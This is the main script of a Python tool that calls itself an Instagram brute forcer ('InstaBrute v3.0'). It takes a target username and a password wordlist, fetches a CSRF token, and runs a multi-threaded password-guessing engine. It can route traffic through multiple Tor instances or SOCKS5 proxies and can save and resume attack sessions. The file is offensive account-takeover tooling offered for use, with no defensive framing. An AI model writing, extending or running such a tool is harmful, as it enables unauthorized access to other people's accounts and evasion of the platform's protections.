#!/usr/bin/env python3
import argparse
import json
import os
import signal
import sys
import time

import config
from config import (
    VERSION,
    generate_device_id, generate_phone_id, generate_guid, generate_adid,
)
from utils import Color, banner
from api import fetch_csrf_token, check_username
from engine import BruteEngine
from tor import start_tor, check_tor


def signal_handler(sig, frame):
    print(f"\n{Color.RED}[*] Interrupted{Color.RESET}")
    default = input(f"\n{Color.GRAY}Save session? [Y/n]: {Color.RESET}").strip().lower()
    if default in ("", "y", "yes"):
        save_session_prompt()
    sys.exit(0)


def save_session_prompt():
    pass


def save_session(username, wordlist, start_idx):
    os.makedirs("sessions", exist_ok=True)
    ts = time.strftime("%Y-%m-%dT%H%M")
    filename = f"sessions/store.session.{username}.{ts}"
    with open(filename, "w") as f:
        json.dump({"user": username, "wordlist": wordlist, "startline": start_idx}, f)
    print(f"{Color.GRAY}Session saved to {filename}{Color.RESET}")
    print(f"{Color.GREEN}Use: python brute.py --resume{Color.RESET}")


def do_start(args):
    banner()

    if args.mode == "tor":
        print(f"{Color.GREEN}[*] Root check skipped (not needed in Python){Color.RESET}")

    if args.tor:
        start_tor()
        working = check_tor()
        if not working:
            return
        port_assignments = {i: port for i, port in enumerate(working)}
        threads = len(working)
    elif args.threads:
        threads = args.threads
        port_assignments = {}
    else:
        threads = 1
        port_assignments = {}

    all_cli = args.username and args.wordlist

    username = args.username
    if not username:
        if sys.stdin.isatty():
            username = input(f"{Color.GREEN}Username : {Color.RESET}").strip()
        else:
            print(f"{Color.RED}[!] --username required in non-interactive mode{Color.RESET}")
            return

    if not check_username(username):
        print(f"{Color.RED}Invalid Username! Try again{Color.RESET}")
        return

    wordlist = args.wordlist
    if not wordlist:
        if sys.stdin.isatty():
            wordlist = input(f"{Color.GREEN}Password List (Enter for pass.txt): {Color.RESET}").strip()
            if not wordlist:
                wordlist = "pass.txt"
        else:
            wordlist = "pass.txt"

    if not os.path.isfile(wordlist):
        print(f"{Color.RED}Wordlist file not found: {wordlist}{Color.RESET}")
        return

    if not args.threads and not args.tor:
        if all_cli:
            threads = 10
        elif sys.stdin.isatty():
            threads_in = input(f"{Color.GREEN}Threads (Use < 20, Default 10): {Color.RESET}").strip()
            threads = int(threads_in) if threads_in else 10
        else:
            threads = 10

    print(f"{Color.GREEN}[*] Fetching CSRF token...{Color.RESET}")
    csrf = fetch_csrf_token()
    print(f"{Color.GREEN}[*] CSRF Token: {Color.GRAY}{csrf}{Color.RESET}")

    engine = BruteEngine(
        username=username, wordlist=wordlist,
        mode=args.mode, debug=args.debug,
        proxy=args.proxy, threads=threads,
        port_assignments=port_assignments,
    )

    signal.signal(signal.SIGINT, lambda s, f: (
        print(f"\n{Color.RED}[*] Interrupted{Color.RESET}"),
        save_session(username, wordlist, 0),
        sys.exit(0)
    ))

    if args.test:
        engine.run_test()
    else:
        engine.run()


def do_resume(args):
    banner()

    if not os.path.isdir("sessions"):
        print(f"{Color.RED}[*] No sessions{Color.RESET}")
        return

    sessions = sorted([
        f for f in os.listdir("sessions")
        if f.startswith("store.session.")
    ])

    if not sessions:
        print(f"{Color.RED}[*] No sessions{Color.RESET}")
        return

    print(f"{Color.GREEN}Saved sessions:{Color.RESET}")
    for i, s in enumerate(sessions, 1):
        with open(f"sessions/{s}", "r") as f:
            data = json.load(f)
        print(f"{Color.GREEN}{i} {Color.GRAY}: {s} (user: {data.get('user')}, wl: {data.get('wordlist')}, start: {data.get('startline')}){Color.RESET}")

    choice = input(f"{Color.GREEN}Choose a session number: {Color.RESET}").strip()
    try:
        idx = int(choice) - 1
        chosen = sessions[idx]
    except (ValueError, IndexError):
        print(f"{Color.RED}Invalid choice{Color.RESET}")
        return

    with open(f"sessions/{chosen}", "r") as f:
        data = json.load(f)

    username = data["user"]
    wordlist = data.get("wordlist", "pass.txt")
    startline = int(data.get("startline", 0))

    if args.tor:
        start_tor()
        working = check_tor()
        if not working:
            return
        port_assignments = {i: port for i, port in enumerate(working)}
        threads = len(working)
    else:
        threads = 1
        port_assignments = {}

    print(f"{Color.GREEN}[*] Resuming session for user: {Color.GRAY}{username}{Color.RESET}")
    print(f"{Color.GREEN}[*] Wordlist: {Color.GRAY}{wordlist}{Color.RESET}")
    print(f"{Color.GREEN}[*] Starting from line: {Color.GRAY}{startline}{Color.RESET}")

    engine = BruteEngine(
        username=username, wordlist=wordlist,
        mode=args.mode, debug=args.debug,
        proxy=args.proxy, threads=threads,
        port_assignments=port_assignments,
    )

    engine.run()


def main():
    parser = argparse.ArgumentParser(
        description="InstaBrute v3.0 - Instagram Brute Forcer (Python)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python brute.py                         Start new brute-force session (direct)
  python brute.py --tor                   Multi-Tor brute-force
  python brute.py --test                  Test mode, stop on first match
  python brute.py --proxy socks5://ip:port  Use custom SOCKS5 proxy
  python brute.py --resume                Resume a saved session
  python brute.py --debug                 Enable debug logging
  python brute.py --username target_user  Skip username prompt
"""
    )

    parser.add_argument("--tor", action="store_true", help="Use multi-Tor mode (5 instances)")
    parser.add_argument("--direct", action="store_true", help="Direct connection, no Tor")
    parser.add_argument("--test", action="store_true", help="Test mode, stop on first match")
    parser.add_argument("--proxy", type=str, help="Custom SOCKS5 proxy (socks5://ip:port)")
    parser.add_argument("--resume", action="store_true", help="Resume a saved session")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    parser.add_argument("--username", type=str, help="Target username")
    parser.add_argument("--wordlist", type=str, help="Path to wordlist file")
    parser.add_argument("--threads", type=int, help="Number of threads (default: 10 for tor, 1 otherwise)")

    args = parser.parse_args()

    if args.direct:
        args.mode = "direct"
        config.REQUEST_DELAY = 5
    elif args.proxy:
        args.mode = "proxy"
        config.REQUEST_DELAY = 5
    elif args.tor:
        args.mode = "tor"
    else:
        args.mode = "direct"

    if args.test:
        args.mode = "direct"
        config.REQUEST_DELAY = 10

    if args.resume:
        do_resume(args)
    else:
        do_start(args)


if __name__ == "__main__":
    main()
